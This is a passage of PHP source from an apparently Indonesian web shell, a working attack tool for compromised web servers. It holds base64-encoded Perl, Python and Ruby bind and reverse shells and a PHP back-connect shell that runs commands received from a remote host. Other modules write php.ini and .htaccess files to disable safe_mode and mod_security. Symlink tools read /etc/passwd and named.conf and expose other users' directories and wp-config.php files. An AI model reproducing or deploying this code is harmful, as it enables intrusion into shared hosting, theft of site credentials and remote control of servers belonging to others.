	$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIlNwZWNpYWwgR3JlZXR6IHRvIDogUGFrIEN5YmVyIFNrdWxseiINCnByaW50ICJ+Iio2MA0KDQpvcy5tYWtlZGlycygna3VkYXN5bXB5JykNCm9zLmNoZGlyKCdrdWRhc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGt1ZGEudHh0IikNCg0KaCA9ICJPcHRpb25zIEluZGV4ZXMgRm9sbG93U3ltTGlua3NcbkRpcmVjdG9yeUluZGV4IGt1ZGEucGh0bWxcbkFkZFR5cGUgdHh0IC5waHBcbkFkZEhhbmRsZXIgdHh0IC5waHAiDQptID0gb3BlbigiLmh0YWNjZXNzIiwidysiKQ0KbS53cml0ZShoKQ0KbS5jbG9zZSgpDQpwcmludCBodGENCg0Kc2YgPSAiPGh0bWw+PHRpdGxlPlN5bWxpbmsgUHl0aG9uPC90aXRsZT48Y2VudGVyPjxmb250IGNvbG9yPXdoaXRlIHNpemU9NT5TeW1saW5rIEJ5cGFzcyAyMDE3PGJyPjxmb250IHNpemU9ND5NYWRlIEJ5IE1pbmRsZXNzIEluamVjdG9yIDxicj5SZWNvZGVkIEJ5IE1yLnhCYXJha3VkYTwvZm9udD48L2ZvbnQ+PGJyPjxmb250IGNvbG9yPXdoaXRlIHNpemU9Mz48dGFibGU+Ig0KDQpvID0gb3BlbignL2V0Yy9wYXNzd2QnLCdyJykNCm89by5yZWFkKCkNCm8gPSByZS5maW5kYWxsKCcvaG9tZS9cdysnLG8pDQoNCmZvciB4dXNyIGluIG86DQoJeHVzcj14dXNyLnJlcGxhY2UoJy9ob21lLycsJycpDQoJc3Vzci5hcHBlbmQoeHVzcikNCnByaW50ICItIiozMA0KeHNpdGUgPSBvcy5saXN0ZGlyKCIvdmFyL25hbWVkIikNCg0KZm9yIHh4c2l0ZSBpbiB4c2l0ZToNCgl4eHNpdGU9eHhzaXRlLnJlcGxhY2UoIi5kYiIsIiIpDQoJc2l0ZXguYXBwZW5kKHh4c2l0ZSkNCnByaW50IGYNCnBhdGg9b3MuZ2V0Y3dkKCkNCmlmICIvcHVibGljX2h0bWwvIiBpbiBwYXRoOg0KCXBhdGg9Ii9wdWJsaWNfaHRtbC8iDQplbHNlOg0KCXBhdGggPSAiL2h0bWwvIg0KY291bnRlcj0xDQppcHM9b3Blbigia3VkYS5waHRtbCIsInciKQ0KaXBzLndyaXRlKHNmKQ0KDQpmb3IgZnVzciBpbiBzdXNyOg0KCWZvciBmc2l0ZSBpbiBzaXRleDoNCgkJZnU9ZnVzclswOjVdDQoJCXM9ZnNpdGVbMDo1XQ0KCQlpZiBmdT09czoNCgkJCWlwcy53cml0ZSgiPGJvZHkgYmdjb2xvcj1ibGFjaz48dHI+PHRkIHN0eWxlPWZvbnQtZmFtaWx5OmNhbGlicmk7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjp3aGl0ZTs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6cmVkOz4lczwvdGQ+PHRkIHN0eWxlPWZvbnQtZmFtaWx5OmNhbGlicmk7Zm9udC13ZWlnaHQ6Ym9sZDs+PGEgaHJlZj1rdWRhLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $kuda = exe("python sym.py");
	echo "<center><a href='dcs_sympy/kudasympy/' target='_blank'><font color='lime'>Click Aja Bro</a></font></center>";
}
elseif($_GET['bypass'] == 'disablefunc'){
		echo "<center><h3>Bypass Disable Functions</h3>";
		echo "<form method='post'><input type='submit' name='ini' value='php.ini'>&nbsp;<input type='submit' name='htce' value='.htaccess'>&nbsp;<input type='submit' name='litini' value='Litespeed'></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"safe_mode = OFF\ndisable_functions = NONE");
		fclose($file);
		echo " <a href='php.ini' target='_blank'>Click Here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
		fclose($file);
		echo " htaccess successfully created!";
}               if(isset($_POST['litini'])){
		$iniph = "PD9waHANCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXTsNCj8+";
		$byph = "c2FmZV9tb2RlID0gT0ZGXG5kaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkU=";
		$comp = "PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPlxuU2VjRmlsdGVyRW5naW5lIE9mZlxuU2VjRmlsdGVyU2NhblBPU1QgT2ZmXG48L0lmTW9kdWxlPg==";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}
}
elseif($_GET['do'] == 'sym404') {
?>
<html>
<title>Symlink404</title>
<script type="text/javascript" src="https://sites.google.com/site/blogrudyhartono/js/SakuraRain.js"></script>
<link href="https://fonts.googleapis.com/css?family=Oregano" rel="stylesheet">
<style>
body{
background-color: black;background-image: url("https://wallpapercave.com/wp/wp2758038.jpg") ;background-repeat:no-repeat ;background-size: 100% 100%;
font-family: "Oregano";
text-align: center;
}
</style>
<font color="#ADFF2F">
<font size=7><b><a href=https://m.facebook.com><b>Symlink Bypass 404</a></b><br>
<img src=https://tools.zone-dark.com/quotes.png height=300px width=300px><br>
<font size=5><form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php" size="25">
<br>Save As : <input name="jnck" value=""><input name="ojaykan" type="submit" value="Tusbol Aja Udah :V"></form><br>

Powered By Mr.TenAr<br><br>
<?php
@error_reporting(0);
@ini_set('display_errors', 0); 
if($_POST['ojaykan']){
echo "<script type='text/javascript'>swal('Success Di Bypass', 'Silahkan Cek Result' , 'success')</script>";
rmdir("sym404");mkdir("sym404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." sym404/".$jnck);
symlink($dir,"sym404/".$jnck);
$inija = fopen("sym404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck);
echo'<a href="sym404/">Klik Gan</a>';	
}
}
elseif($_GET['do'] == 'bctools'){
      echo "<center><h3>Back Connect Tools</h3>";
      echo "<form method='post'>
      <span>Bind port to /bin/sh [Perl]</font></span><br/>
      Port: <input type='text' name='port' value='666'> <input type='submit' name='bpl' value='>>'>
      <br><br>
      <span>Back-Connect</span><br/>
      Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='666'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select> <input type=submit value='>>'>";
      echo "</form>";
      echo "</center>";
        if($_POST['bpl']) {
        $bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
        $brt=@fopen('bp.pl','w');
      fwrite($brt,$bp);
      $out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
      sleep(1);
      echo "<center><pre>$out\n".exe("ps aux | grep bp.pl")."</pre></center>";
      unlink("bp.pl");
          }
          if($_POST['backconnect'] == 'perl') {
      $bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
      $plbc=@fopen('bc.pl','w');
      fwrite($plbc,$bc);
      $out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
      sleep(1);
      echo "<center><pre>$out\n".exe("ps aux | grep bc.pl")."</pre></center>";
      unlink("bc.pl");
      }
      if($_POST['backconnect'] == 'python') {
      $becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
      $pbcaa=@fopen('bcpyt.py','w');
      fwrite($pbcaa,$becaa);
      $out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
      sleep(1);
      echo "<center><pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre></center>";
      unlink("bcpyt.py");
      }
      if($_POST['backconnect'] == 'ruby') {
      $becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
      $pbcaak=@fopen('bcruby.rb','w');
      fwrite($pbcaak,$becaak);
      $out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
      sleep(1);
      echo "<center><pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre></center>";
      unlink("bcruby.rb");
      }
      if($_POST['backconnect'] == 'php') {
                  $ip = $_POST['server'];
                  $port = $_POST['port'];
                  $sockfd = fsockopen($ip , $port , $errno, $errstr );
                  if($errno != 0){
                    echo "<br><font color='red'>$errno: $errstr</font>";
                  } else if (!$sockfd)  {
                    $result = "<br><p>Unexpected error has occured, connection may have failed.</p>";
                  } else {
                    fputs ($sockfd ,"
                      \n{#######################################}
                      \n..:: BackConnect PHP By Mr.xBarakuda ::..
                      \n{#######################################}\n");
                    $dir = shell_exec("pwd");
                    $sysinfo = shell_exec("uname -a");
                    $time = shell_exec("time");
                    $len = 1337;
                    fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
                    while(!feof($sockfd)){ $cmdPrompt = 'root@mrxbarakuda:~ $';
                    fputs ($sockfd , $cmdPrompt );
                    $command = fgets($sockfd, $len);
                    fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
                  }
                  fclose($sockfd);
                }
            }
?>
<?php
}
elseif($_GET['do'] == 'hashgen') {
$submit = $_POST['enter'];
if (isset($submit)) {
	echo "<script type='text/javascript'>swal('Success Hash', 'Silahkan Cek Result' , 'success')</script>";
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4", $pass);
$hash_md5 = md5($salt . $pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256", $text);
$hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
}
echo '<form action="" method="post">';
echo '<center><h3>Hash Generator</h3>';
echo '<table>';
echo 'Masukkan teks yang ingin di encrypt: ';
echo '<input class="inputz" type="text" name="password" size="40">';
echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
echo '<br>';
echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
?>
<?php
}
elseif ($_GET['do'] == 'hashid'){
if(isset($_POST['gethash'])){
	echo "<script type='text/javascript'>swal('Success Hash', 'Silahkan Cek Result' , 'success')</script>";
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "<script type='text/javascript'>swal('Failed Result', 'Gagal Hash' , 'error')</script>";
		}
	}else{
		$hashresult = "Tidak ada hash yang dimasukan";
	}
	
	?>
<center>
<form action="" method=post><tr>
<table class=tabnet>
<th colspan=5><h3>Hash Identifer / analisis type hash</th></h3>
<tr class=optionstr><b><td>Masukan Hash</td></b><td>:</td>	<td><input type=text name=hash size=60 class=inputz /></td><td><input type=submit class=inputzbut name=gethash value=Identify Hash /></td></tr>
<tr class=optionstr><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
</table></tr></form><br>

POWERED BY: Mr.TenAr
</center>
<?php
} elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("Dark_Sym",0777);
@chdir("Dark_Sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex 008.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=3 style='width:60%;border-color:#8B0000;'>
<tr>
<td align=center><font color=lime size=2>S. No.</font></td>
<td align=center><font color=lime size=2>Domains</font></td>
<td align=center><font color=lime size=2>Users</font></td>
<td align=center><font color=lime size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/Dark_Sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("Dark_Sym",0777);
@chdir("Dark_Sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex 008.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
